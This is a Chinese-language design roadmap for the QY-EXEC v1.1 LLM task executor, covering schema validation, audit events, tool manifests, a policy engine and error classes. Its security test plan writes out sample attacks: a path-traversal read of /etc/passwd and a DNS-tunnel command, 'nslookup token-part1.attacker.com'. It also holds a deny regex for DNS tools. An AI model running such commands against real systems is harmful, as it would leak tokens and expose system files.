# QY-EXEC v1.1 战略演进蓝图 (QY-EXEC Strategic Evolution Blueprint)

> **导言 (Strategic Intent)**
> QY-EXEC 的定位必须始终保持 **“造螺丝钉，不造航空母舰”** 的极致纯粹。
> 为了保障本执行器在未来 5 年至 10 年具备坚不可摧的接口确定性、可替换性与可测试性，v1.1 架构演进方案将所有“策略、智能与协议”彻底外置。
> 本蓝图根据两任专业顾问提出的 10 大核心优先级，为下一阶段的开发、工程规范与集成契约设计提供标准落地方案。

---

## 1. 核心架构升级 (Core Architectural Enhancements)

### 1.1 契约中心化：Schema 强校验层 (Point 1 & 2: Task Schema Validation)
* **现状分析**：之前的 QY-EXEC 直接通过代码解析传入的 JSON 任务文件，字段不一致或非法类型极易引起进程空转或意外挂起。
* **演进设计**：
  在控制中心与物理执行器的数据入口层，全面引入标准 JSON Schema 校验组件：
  1. 引入 `$schema` 标识，任何流入系统的 JSON 任务必须在第 1 毫秒通过 `task_schema.json` 规则链验证。
  2. 显式校验 `schemaVersion`（当前为 `"1.1"`）与提交者身份 `submitter`。
  3. 若验证失败，不进入待处理队列，直接返回非法的格式参数（400 Bad Request），确保错误在边缘就被拦截。

### 1.2 事件（Event）升级为系统第一公民 (Point 2: Event-Driven Auditing)
* **现状分析**：普通的系统 Logs 是为人肉阅读设计的非结构化文本，机器极难对其进行追踪、Replay 调试或多活审计。
* **演进设计**：
  将系统的日志链（Log Entries）全面演化为 **结构化审计事件链（Structured Audit Events）**。每一个日志事件必须包含固定的事件标识。
* **事件类型规范 (Standardized Event Payload)**：
  ```json
  {
    "timestamp": "2026-07-13T20:30:45.123Z",
    "type": "tool_call",
    "message": "执行物理工具 write_file",
    "details": {
      "eventId": "evt_write_file_001",
      "task_id": "task-171829283-node-1234",
      "eventName": "TOOL_EXECUTION_STARTED",
      "executorId": "win-node-01",
      "payload": {
        "tool": "write_file",
        "target": "workspace/hello.md",
        "bytesCount": 512
      }
    }
  }
  ```
* **价值体现**：通过将 Logs 事件化，系统的运维 Dashboard、离线日志回放（Replay）、行为轨迹追踪（Tracing）都可以基于标准的 JSON Event 流实现，完全不干涉执行器内核。

### 1.3 工具声明插件化：Tool Manifest & Metadata (Point 3: Capability Discovery)
* **现状分析**：现有物理工具（`read_file`, `write_file`, `bash`, `patch`）硬编码于 Python 执行端，模型无法在执行前推断工具的副作用、执行时限或容错代价。
* **演进设计**：
  执行端引入独立的 `tools/` 元数据目录。每一个工具对应一个 Manifest yaml 文件描述其底层语义与安全属性。
* **清单示例 (`tools/write_file.yaml`)**：
  ```yaml
  name: write_file
  description: "原子化写入、覆盖指定白名单目录下的本地文件"
  schemaVersion: "1.0"
  timeoutSeconds: 5
  securityLevel: "Medium"
  sideEffects:
    - filesystem_write
  idempotent: true
  rollbackSupported: true
  rollbackStrategy: "backup_diff_restore"
  ```
* **价值体现**：Planner (LLM) 可在请求工具前主动拉取 Manifest 列表，具备了自动进行**“能力发现（Capability Discovery）”** 的潜质，从根本上隔离了工具的执行逻辑和声明逻辑。

### 1.4 能力与策略解耦：Policy Engine (Point 4: Policy Decoupling)
* **现状分析**：黑名单正则拦截规则（如拒绝电源管理、DNS 隧道工具）目前与 `/server.ts` 及物理执行核心代码强绑定。规则修改需要重新部署、打包代码。
* **演进设计**：
  将控制代码中的规则链外置为 **“策略引擎（Policy Engine）”** 配置文件：`policies/security_policy.json`。
  * **结构抽象**：
    ```json
    {
      "policyName": "QY-EXEC Default Air-gapped Shield",
      "policyVersion": "1.2.0",
      "denyPatterns": [
        {
          "pattern": "\\b(nslookup|ping|dig|host)\\b",
          "category": "DNS_TUNNEL_EXFILTRATION",
          "action": "BLOCK_AND_LOG_CRITICAL"
        }
      ],
      "whitelistDirs": ["/workspace", "/bridges"]
    }
    ```
  * **机制**：执行器与协调器仅加载策略描述，执行统一规则核验。后续安全升级（如突发新型侧信道绕过攻击）仅需热更新策略 JSON，无需修改底层内核逻辑。

### 1.5 上下文注入外置化：Context Provider (Point 5: Context Injection Decoupling)
* **现状分析**：系统硬性从本地加载 `behavior_guidelines.md`（原 `AGENTS.md`）和 `core_principles.md`。
* **演进设计**：
  在协调器中抽象出标准 **Context Provider 接口**：
  * **核心定义**：`IContextProvider`。
  * **数据流**：启动时或任务入队时，协调器调用注册的 Provider 链（如 `WorkspacePrinciplesProvider`、`SystemSettingsProvider`），各 Provider 返回一段定制文本，最终由 Engine 拼装为一整段 System Prompt。执行器内核对文本来源完全不关心，实现极致解耦。

### 1.6 系统身份标示：System Identity & Capability Announcement (Point 6: Dispatch Optimization)
* **现状分析**：分布式部署下，多个执行器被视为完全同构的节点。但实际可能存在操作系统的差异（Windows vs Linux）。
* **演进设计**：
  执行器在启动心跳中主动声明自己的 **Identity & Capability 元数据**：
  * **声明内容**：
    ```json
    {
      "nodeId": "qy-exec-win-01",
      "os": "windows-11-enterprise",
      "features": ["job_object_isolation", "powershell_7", "patch_v1.1"],
      "cpuCores": 8,
      "availableMemoryBytes": 17179869184
    }
    ```
  * **调配价值**：控制中心在接收到特定任务时（例如需调用特殊的 Windows API 任务），可根据 Capabilities 列表自动分拨到最契合的执行节点上。

### 1.7 结果（Result）标准化与错误分层 (Point 7 & 9: Diagnostics)
* **现状分析**：以往的 `_result.json` 仅包含基础的 `summary`、`error` 文本，调用端无法敏锐识别究竟是 OS 盘满了、LLM 输出断流，还是工具在物理执行中挂了。
* **演进设计**：
  细化 `errorClassification` 标准，强制对异常状态进行溯源分类：
  * **五大核心故障归类 (Layered Failure Classification)**：
    1. `OS_ERROR`：底层硬件、磁盘已满、物理路径锁冲突等系统故障。
    2. `TOOL_ERROR`：脚本语法错误、命令执行超时、黑名单触发。
    3. `MODEL_ERROR`：LLM 无法解析 Function Calling、拒答、或请求 API 熔断。
    4. `SYSTEM_RECLAIM_BREAKER`：连续 5 次心跳过期，被协调器强行击穿熔断。
    5. `UNKNOWN_ERROR`：未知边界故障。

### 1.8 终极时间轴统一：ISO8601 UTC (Point 8: Chrono Alignment)
* **规范契约**：
  所有数据结构、心跳（Heartbeat）、事务 JSON 内部时间戳必须强制使用 **UTC（协调世界时）的 ISO8601 格式**。
  * **标准格式**：`YYYY-MM-DDTHH:mm:ss.sssZ` (例如 `2026-07-13T20:30:45.123Z`)。
  * 杜绝任何宿主机时区 Locale 或非标准字符串形式，消除后续跨时区调度和追溯时的对齐技术债。

## 2. 演进纪律：坚决捍卫真实、可验证的代码

> **警告：拒绝语义漂移，测试即正义。**
> 任何宏大的安全与隔离架构设计，如果不配以坚固、无情的自动化测试进行验证，都极易退化成流于形式的纸面文章（“PPT 架构”）。
> QY-EXEC 未来每一项对外宣称的“安全拦截能力”、“高可靠熔断”都必须由独立的回归脚本检验。

### 2.1 自动化安全校验测试用例 (Security Regression Tests)
我们制定了以下 4 大核心能力的自动化回归校验（测试即法律）：
1. **路径穿越测试 (Path Traversal Attacker)**：
   * **模拟攻击**：向执行器传入 `read_file(target="../../../../etc/passwd")`
   * **预期行为**：系统判定为拒绝访问，并在 `security.log` 中录入阻断记录，判定通过。
2. **DNS 隧道防御测试 (DNS Tunnel Attacker)**：
   * **模拟攻击**：通过 bash 执行 `nslookup token-part1.attacker.com`
   * **预期行为**：`DANGEROUS_PATTERNS` 正则在第 1 毫秒识别并拦截，物理进程强制关闭，任务直接标记为失败，报错原因为“黑名单指令熔断拦截”。
3. **僵尸重试断路器测试 (Zombie Breaker Test)**：
   * **模拟行为**：人为在 `running/` 下创建一个锁文件并将其心跳暂停 65 秒。
   * **预期行为**：协调器第 1 次回收、第 2 次回收……在第 5 次后，系统完全解绑该任务，强行发布 `SYSTEM_RECLAIM_BREAKER` 级别的失败 `_result.json`，清理所有痕迹。
4. **磁盘水位测试 (Disk Threshold Test)**：
   * **模拟行为**：伪造磁盘水位检测函数返回 95%。
   * **预期行为**：新任务提交请求立刻返回 507 Insufficient Storage，且控制台输出结构化纠错建议指导用户清理日志和完成归档。
